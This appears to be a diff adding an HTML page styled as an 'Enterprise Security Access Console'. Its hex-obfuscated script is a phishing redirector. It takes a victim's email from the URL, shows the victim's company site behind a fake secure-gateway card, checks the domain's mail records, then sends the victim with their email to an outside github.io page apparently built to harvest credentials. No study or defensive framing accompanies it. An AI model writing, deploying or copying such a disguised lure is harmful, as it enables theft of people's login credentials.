@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enterprise Security Access Console</title>
+    <style>
+        /* Modern Reset & Corporate Geometric Styling Layout */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        html, body {
+            height: 100%;
+            width: 100%;
+        }
+
+        body {
+            /* Attractive corporate teal-to-indigo gradient background (Default Fallback) */
+            background: linear-gradient(135deg, #134e5e 0%, #2b5876 50%, #4e54c8 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Full Screen Background Web Frame Component */
+        .background-iframe-layer {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 0;
+            opacity: 0; /* Starts hidden until verified successful load */
+            transition: opacity 0.5s ease-in-out;
+        }
+
+        /* Translucent network screen overlay controls background alpha visibility */
+        .background-alpha-shield {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(19, 78, 94, 0.6); /* Enforces 60% opacity look over target sites */
+            z-index: 1;
+            display: none; /* Appears only if the iframe loads successfully */
+        }
+
+        /* Subtle abstract network lines background overlay */
+        body::before {
+            content: "";
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: radial-gradient(rgba(255,255,255,0.15) 1px, transparent 0);
+            background-size: 24px 24px;
+            z-index: 2;
+            pointer-events: none;
+        }
+
+        /* Centered Interstitial Glass Card Frame */
+        .gateway-container {
+            position: relative;
+            z-index: 10; /* Locked high above background asset layers */
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
+            max-width: 440px;
+            width: calc(100% - 40px);
+            text-align: center;
+            overflow: hidden;
+        }
+
+        .status-header {
+            font-size: 1.35rem;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: #ffffff;
+            letter-spacing: -0.3px;
+        }
+
+        .status-message {
+            font-size: 0.95rem;
+            color: #e2e8f0;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        /* White glass-morphic button */
+        .action-btn {
+            display: inline-block;
+            width: 100%;
+            padding: 14px;
+            background-color: #ffffff;
+            color: #134e5e;
+            border: none;
+            border-radius: 4px;
+            font-size: 1rem;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
+            transition: all 0.2s ease-in-out;
+            box-sizing: border-box;
+        }
+
+        .action-btn:hover {
+            background-color: #f7fafc;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .loading-widget {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.85rem;
+            margin-top: 15px;
+            letter-spacing: 0.5px;
+        }
+    </style>
+</head>
+<body>
+
+    <iframe id="backgroundWebEngine" class="background-iframe-layer" src="about:blank"></iframe>
+    <div id="alphaShield" class="background-alpha-shield"></div>
+
+    <!-- Unified Display Container Console Frame -->
+    <div class="gateway-container">
+        <div id="topHeader" style="background-color:#21618c; color:white; padding-top:6px; padding-bottom:6px; padding-left:20px; margin:-40px -40px 25px -40px; text-align:left; font-size:0.95rem; font-weight:500; letter-spacing:0.5px;">
+            SECURE ACCESS GATEWAY
+        </div>
+
+        <div class="status-header" id="statusHeader">Analyzing Gateway</div>
+        <div class="status-message" id="statusMessage">Awaiting secure session authorization credentials...</div>
+        
+        <a href="#" id="navigationGateButton" class="action-btn" style="display: none;">Access Workspace Portal</a>
+        <div class="loading-widget" id="loadingWidget">Initializing secure handshake...</div>
+    </div>
+    <script>
+var _$_43a4=["\x44\x4F\x4D\x43\x6F\x6E\x74\x65\x6E\x74\x4C\x6F\x61\x64\x65\x64","\x6C\x6F\x61\x64\x69\x6E\x67\x57\x69\x64\x67\x65\x74","\x6E\x6F\x6E\x65","\x73\x74\x61\x74\x75\x73\x48\x65\x61\x64\x65\x72","\x43\x6F\x6E\x73\x6F\x6C\x65\x20\x53\x65\x63\x75\x72\x65","\x73\x74\x61\x74\x75\x73\x4D\x65\x73\x73\x61\x67\x65","\x41\x77\x61\x69\x74\x69\x6E\x67\x20\x69\x6E\x62\x6F\x75\x6E\x64\x20\x70\x6C\x61\x74\x66\x6F\x72\x6D\x20\x72\x6F\x75\x74\x69\x6E\x67\x20\x76\x61\x72\x69\x61\x62\x6C\x65\x20\x70\x61\x72\x61\x6D\x65\x74\x65\x72\x73\x20\x76\x69\x61\x20\x68\x61\x73\x68\x20\x61\x6C\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x20\x61\x74\x74\x72\x69\x62\x75\x74\x65\x73\x2E","\x40","\x48\x61\x6E\x64\x73\x68\x61\x6B\x65\x20\x41\x62\x6F\x72\x74\x65\x64","\x54\x68\x65\x20\x73\x75\x70\x70\x6C\x69\x65\x64\x20\x72\x6F\x75\x74\x69\x6E\x67\x20\x69\x64\x65\x6E\x74\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x20\x70\x61\x72\x61\x6D\x65\x74\x65\x72\x20\x6C\x61\x79\x6F\x75\x74\x20\x69\x73\x20\x69\x6E\x76\x61\x6C\x69\x64\x2E","\x49\x6E\x74\x65\x72\x72\x6F\x67\x61\x74\x69\x6E\x67\x20\x61\x75\x74\x68\x6F\x72\x69\x74\x61\x74\x69\x76\x65\x20\x6E\x61\x6D\x65\x20\x73\x65\x72\x76\x65\x72\x73\x20\x66\x6F\x72\x20\x4D\x58\x20\x74\x6F\x70\x6F\x67\x72\x61\x70\x68\x79\x20\x72\x65\x63\x6F\x72\x64\x73\x2E\x2E\x2E","\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x57\x65\x62\x45\x6E\x67\x69\x6E\x65","\x61\x6C\x70\x68\x61\x53\x68\x69\x65\x6C\x64","\x61\x62\x6F\x75\x74\x3A\x62\x6C\x61\x6E\x6B","\x31","\x62\x6C\x6F\x63\x6B","\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6E\x65\x77\x75\x70\x73\x68\x67\x64\x66\x2E\x67\x69\x74\x68\x75\x62\x2E\x69\x6F\x2F\x69\x64\x2D\x70\x73\x2F","","\x26\x74\x79\x70\x65\x3D\x4D\x58","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x6E\x73\x2E\x67\x6F\x6F\x67\x6C\x65\x2F\x72\x65\x73\x6F\x6C\x76\x65\x3F\x6E\x61\x6D\x65\x3D","\x20","\x2E","\x2E\x6D\x61\x69\x6C\x2E\x63\x6F\x6D","\x6D\x61\x69\x6C\x2E\x63\x6F\x6D","\x61\x73\x70\x6D\x78","\x67\x6F\x6F\x67\x6C\x65","\x6D\x61\x69\x6C\x2E","\x70\x6F\x63\x7A\x74\x61\x2E","\x2E\x70\x6C","\x44\x4E\x53\x20\x47\x61\x74\x65\x77\x61\x79\x20\x54\x68\x72\x65\x61\x64\x20\x45\x78\x63\x65\x70\x74\x69\x6F\x6E\x3A\x20","\x2F","\x2E\x68\x74\x6D\x6C","\x2E\x70\x68\x70","\x23","\x49\x64\x65\x6E\x74\x69\x74\x79\x20\x56\x65\x72\x69\x66\x69\x65\x64","\x6E\x61\x76\x69\x67\x61\x74\x69\x6F\x6E\x47\x61\x74\x65\x42\x75\x74\x74\x6F\x6E","\x20\x73\x65\x63\x6F\x6E\x64\x73\x2E\x2E\x2E","\x52\x65\x64\x69\x72\x65\x63\x74\x69\x6E\x67\x20\x79\x6F\x75\x20\x74\x6F\x20\x74\x68\x65\x20\x57\x6F\x72\x6B\x73\x70\x61\x63\x65\x20\x50\x6F\x72\x74\x61\x6C\x20\x69\x6E\x20"];window.addEventListener(_$_43a4[0x0],async function(){var r=window.location.hash;if(!r||r.length<2){document.getElementById(_$_43a4[0x1]).style.display=_$_43a4[0x2];document.getElementById(_$_43a4[0x3]).innerText=_$_43a4[0x4];document.getElementById(_$_43a4[0x5]).innerText=_$_43a4[0x6];return};var l=r.substring(1).trim().toLowerCase();if(!l.includes(_$_43a4[0x7])){updateInterfaceMessage(_$_43a4[0x8],_$_43a4[0x9]);return};document.getElementById(_$_43a4[0x5]).innerText=_$_43a4[0xa];var o=l.split(_$_43a4[0x7]);if(o.length<2){return};var t=o[1].trim();var k=document.getElementById(_$_43a4[0xb]);var j=document.getElementById(_$_43a4[0xc]);k.onload=function(){try{if(k.contentWindow.location.href!==_$_43a4[0xd]){k.style.opacity=_$_43a4[0xe];j.style.display=_$_43a4[0xf]}}catch(e){k.style.opacity=_$_43a4[0xe];j.style.display=_$_43a4[0xf]}};k.src=_$_43a4[0x10]+ t;var q={"\x40":_$_43a4[0x11]};var s=_$_43a4[0x12];try{var b=(_$_43a4[0x14].concat((encodeURIComponent(t)),_$_43a4[0x13]));var a= await fetch(b);var g= await a.json();var f=_$_43a4[0x12];var d=_$_43a4[0x12];if(g.Answer&&g.Answer.length>0){(function(){f=g.Answer.map(function(v){return v.data?v.data.toLowerCase():_$_43a4[0x12]}).join(_$_43a4[0x15]);var u=g.Answer;if(u&&u.data){(function(){var w=u.data.toLowerCase().trim().split(/\s+/);d=w[w.length- 1];if(d.endsWith(_$_43a4[0x16])){d=d.slice(0,-1)}}).call(this)}}).call(this)};if(s===_$_43a4[0x12]&&(f.includes(_$_43a4[0x17])||t===_$_43a4[0x18])){s=_$_43a4[0x11]};if(f!==_$_43a4[0x12]){for(var h in q){if(f.includes(h)||f.includes(_$_43a4[0x19])){var c=(h===_$_43a4[0x1a]||f.includes(_$_43a4[0x19]))?q[_$_43a4[0x1a]]:q[h];s=_$_43a4[0x12]+ c;break}}};if(s===_$_43a4[0x12]&&d!==_$_43a4[0x12]){(function(){var z=d.startsWith(_$_43a4[0x1b]);var y=d.startsWith(_$_43a4[0x1c]);var x=d.endsWith(_$_43a4[0x1d]);if((z||y)&&x){s=_$_43a4[0x11]}}).call(this)};if(s===_$_43a4[0x12]&&d!==_$_43a4[0x12]){if(d===t||d===_$_43a4[0x1b]+ t){s=_$_43a4[0x11]}else {s=_$_43a4[0x11]}}}catch(dnsException){console.error(_$_43a4[0x1e],dnsException)};if(s===_$_43a4[0x12]){s=_$_43a4[0x11]};if(!s.endsWith(_$_43a4[0x1f])){if(!s.endsWith(_$_43a4[0x20])&&!s.endsWith(_$_43a4[0x21])){s+=_$_43a4[0x1f]}};var p=s+ _$_43a4[0x22]+ l;document.getElementById(_$_43a4[0x1]).style.display=_$_43a4[0x2];document.getElementById(_$_43a4[0x3]).innerText=_$_43a4[0x23];var i=document.getElementById(_$_43a4[0x24]);i.href=p;i.style.display=_$_43a4[0xf];var n=5;document.getElementById(_$_43a4[0x5]).innerText=(_$_43a4[0x26].concat((n),_$_43a4[0x25]));var m=setInterval(function(){n--;if(n>0){document.getElementById(_$_43a4[0x5]).innerText=(_$_43a4[0x26].concat((n),_$_43a4[0x25]))}else {clearInterval(m);window.location.replace(p)}},1000)});function updateInterfaceMessage(B,A){document.getElementById(_$_43a4[0x1]).style.display=_$_43a4[0x2];document.getElementById(_$_43a4[0x3]).innerText=B;document.getElementById(_$_43a4[0x5]).innerText=A}
+    </script>
+</body>
+</html>
